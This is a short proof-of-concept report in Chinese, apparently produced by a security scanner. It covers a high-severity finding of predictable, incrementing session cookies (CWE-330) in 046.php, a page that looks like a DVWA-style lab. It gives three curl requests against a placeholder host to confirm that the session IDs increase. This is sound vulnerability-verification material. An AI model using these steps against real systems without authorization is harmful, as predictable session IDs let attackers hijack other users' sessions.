# POC — 046.php 会话标识基于自增整数，可预测（CWE-330）

- finding_id: `SEM-19354a0facf2`
- type: `weak_id` / CWE-330
- severity: `high`
- file: `046.php:6`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/046'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **在保持同一会话的情况下第一次 POST，记录 Set-Cookie**  
```http
curl -sS -i -X POST 'http://TARGET:8080/046' -H 'Content-Type: application/x-www-form-urlencoded'
```
预期：返回 dvwaSession 等会话 Cookie，记录其值

3. **保持同一会话再次 POST，并比较两次会话 Cookie**  
```http
curl -sS -i -X POST 'http://TARGET:8080/046' -H 'Content-Type: application/x-www-form-urlencoded'
```
预期：Cookie 值出现 1、2、3 等递增/可预测序列，或可重放访问

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。